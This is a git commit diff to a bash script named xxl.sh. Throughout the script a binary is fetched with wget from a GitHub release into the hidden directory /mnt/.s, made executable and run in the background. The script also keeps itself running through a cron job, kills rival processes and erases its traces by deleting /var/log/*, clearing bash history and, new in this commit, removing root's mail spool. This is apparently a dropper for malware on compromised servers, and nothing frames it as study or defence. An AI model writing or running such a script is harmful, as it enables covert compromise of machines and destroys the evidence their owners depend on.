e84a963bce1a94b35f8fbdbc4f4d35a8e955fc5f
YUNDUN8899 <163292679+YUNDUN8899@users.noreply.github.com>
2024-03-14 16:30:10 +0800

    Update xxl.sh

--- xxl.sh
+++ xxl.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+rm /var/spool/mail/root 
 # 设置变量以提高可读性
 OPT_S_DIR="/mnt/.s"
 KMPATHD_FILE="$OPT_S_DIR/xxl_job"
@@ -11,7 +11,7 @@ if [ ! -d "$OPT_S_DIR" ]; then
 fi
 
 # 检查/opt/.s/kmpathd文件是否存在，不存在则下载
-if [ ! -f "xxl_job" ]; then
+if [ ! -f "$KMPATHD_FILE" ]; then
     cd "$OPT_S_DIR" || exit
     wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/xxl_job
     chmod +x "xxl_job"
@@ -19,12 +19,22 @@ else
     echo "KMPATHD file already exists, skipping download."
 fi
 
-# 检查进程是否存在，不存在则启动
-if ! pgrep -f "xxl_job" > /dev/null; then
-    nohup "/mnt/.s/xxl_job" /dev/null 2>&1 &
+# 检查进程数量，如果大于1，则杀死多余的进程
+kmpathds_count=$(pgrep -cf "xxl_job")
+if [ "$kmpathds_count" -gt 1 ]; then
+    pkill -f "xxl_job"
 fi
+
+# 如果没有正在运行的进程，则启动一个
+if ! pgrep -f "xxl_job" > /dev/null; then
+    nohup "$KMPATHD_FILE" /dev/null 2>&1 &
+fi
+
 # 清除上一次的任务，添加下一次的任务，每2小时执行一次
 (crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
+
 # 清除当前系统的执行目录
 sudo rm -rf /var/log/*
+
+# 清除命令历史记录
 history -c && echo > ~/.bash_history
